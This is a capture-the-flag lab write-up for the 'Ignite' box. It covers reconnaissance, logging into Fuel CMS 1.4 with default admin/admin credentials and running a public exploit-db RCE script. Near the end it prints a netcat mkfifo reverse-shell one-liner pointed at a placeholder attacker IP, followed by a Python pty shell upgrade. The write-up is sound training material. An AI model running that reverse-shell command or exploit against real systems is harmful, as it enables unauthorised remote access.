# Ignite Write-Up

This is an easy level CTF called Ignite. It specifically says "A new startup has a few issues with their web server." And we are tasked with getting two flags (user.txt and root.txt).

I started with an nmap scan to see which ports are available with the given IP. This is a web application CTF, so I know there will be an http or https port open at the least.

After the scan we see that port 80 is the only port open. With the aggressive scan we can also see that the http title says "Welcome to Fuel CMS". This is a content management system an I want to check the version if I can. Additionally, there is a robots.txt which disallows the directory /fuel. So we will check both of these out.

I also ran a gobuster scan to see if there were any other directories of value; however, I did not find anything of importance.

Looking at the website we see that this is powered by Fuel CMS 1.4. And there is quite a lot of information on the website. There are admin login credentials for the fuel directory given. They are: admin and admin. So I went to test these out to see if they weren't changed. And sure enough, they worked. After looking into the admin panel I found a few things that could be valuable. There was an assets page where you could upload a file and there was a page that showed the permissions of our user. This immediately made me think of a file upload RCE, so maybe we could get a web shell this way.

Before I went any deeper I decided to check searchsploit to see if there were any known vulnerabilities in Fuel CMS version 1.4. And I found that this CMS version was vulnerable to remote code execution or RCE. Kali linux gives you a database of exploits through exploitdb so I decided to use the python code available for the RCE. Make sure that you add the url to the end.

After executing the python code, we have a web shell. Worked great.

Although we have a web shell it is not the best. No ctrl+c, no su, no ssh, etc. I find the best practice is to use netcat to listen and export the webshell to our own terminal and then stabilize it for better functionality. So I first set up the listener on a seperate terminal listening on port 1234. Then I used the netcat webshell provided by [PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). This is the command that I used: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_ADDRESS> <NC_LISTENER_PORT> >/tmp/f Make sure to change the port and IP to your THM VPN or Attackbox. Then to stablize the shell we use the command (make sure the host has python): python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
